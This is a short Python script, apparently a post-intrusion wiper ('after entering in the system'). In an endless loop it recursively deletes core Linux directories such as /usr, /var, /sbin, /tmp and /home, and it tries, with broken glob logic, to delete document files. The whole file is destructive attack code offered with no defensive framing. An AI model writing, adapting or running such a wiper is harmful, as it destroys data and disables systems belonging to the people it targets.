# after entering in the system
#!/usr/bin/env python
import os
import sys
import shutil

list_os=["/home/","/tmp/","/usr/","/var/","/sys/","/sbin/","/mnt/","/srv/","/dev/","/proc/"]
list_os_w=["/home/*.txt","/home/*.pdf","/home/*.rar"]

def delete_file(file1):
    os.remove(file1)
    
def delete_dir(dir1):
    shutil.rmtree(dir1,ignore_errors=True,onerror=None)
    

def search_files_home():
    list_file=["/home/*.txt","/home/*.pdf","/home/*.rar"]
    for file in list_file:
        if file in list_os[0]:
            try:
                delete_file(file)
                pass
            except BaseException as e:
                print(e)
                pass
        elif file in list_os_w[0]:
            try:
                delete_file(file)
                pass
            except BaseException as e:
                print(e)
                pass
        elif file in list_os_w[1]:
            try:
                delete_file(file)
                pass
            except BaseException as e:
                print(e)
                pass
        elif file in list_os_w[2]:
            try:
                delete_file(file)
                pass
            except BaseException as e:
                print(e)
                pass
                      
def del_all():
    for x in range(1,8):
        try:
            delete_dir(list_os[x])
            pass
        except BaseException as e:
            print(e)
            pass
        finally:
            delete_dir(list_os[0])
            pass
        
while True:
    try:
        search_files_home()
        pass
    except BaseException as e:
        print(e)
        pass
    finally:
        del_all()
        pass
    